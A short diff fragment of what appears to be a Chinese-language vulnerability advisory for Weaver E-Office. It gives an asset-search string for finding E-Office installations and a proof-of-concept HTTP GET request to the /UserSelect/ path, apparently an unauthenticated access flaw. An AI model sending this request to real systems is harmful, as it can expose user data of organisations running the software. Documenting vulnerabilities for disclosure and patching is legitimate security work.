@@ -36,11 +36,11 @@ app="泛微-EOffice"
   
 漏洞数据包：  
 ```
-GET /UserSelect/ HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
+GET /UserSelect/ HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
 ```  
   
 ![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3YdWDC19MibDv1IdyrfNIxZt47xsK2tsa1TIsvka5t6GusYfoOmYRFmme16ZID3S4T6d9GHGg3AWdw/640?wx_fmt=jpeg&from=appmsg "null")  
